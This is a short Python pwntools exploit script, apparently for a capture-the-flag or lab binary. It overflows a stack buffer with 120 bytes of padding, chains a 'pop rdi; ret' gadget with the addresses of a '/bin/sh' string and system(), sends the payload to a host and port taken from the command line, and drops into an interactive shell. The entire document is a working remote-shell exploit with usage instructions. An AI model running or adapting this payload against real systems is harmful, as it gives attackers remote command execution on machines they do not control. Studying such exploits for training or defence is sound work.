
#!/usr/bin/env python

from pwn import *
import sys

def buildPayload():
	payload = ""
	#junk to overflow
	payload += "A"*120
	#payload += "BBBBBB" #was used to check if EIP was properly overwritten
	#ropgadget, pop rdi; ret;
	payload += p64(0x00000000004006cb)

	#bin/sh
	payload += p64(0x40086f)
	#need a legitimate function
	#for padding (this prints out the library version)
	#to avoid an error involving the movaps instruction
	payload += p64(0x7ffff7a05ca0)
	#system()
	payload += p64(0x7ffff7a33440)
	return payload

def connect(payload):
	username = "doesntmatter\n"
	s = remote(sys.argv[1], int(sys.argv[2]))
	print s.recv()
	s.send(username)
	print s.recv()
	s.send(payload)
	s.interactive()
	print s.recvuntil(' ', drop = True)

def main():
	if (len(sys.argv) == 3):
		payload = buildPayload()
		connect(payload)
	else:
		print "Wrong number of arguments."
		print "Example command:"
		print "python exploit.py 127.0.0.1 8080"
		print "replace 127.0.0.1 with the ip of the target host"
		print "replace 8080 with port of application to target"

if __name__ == "__main__":
	main()
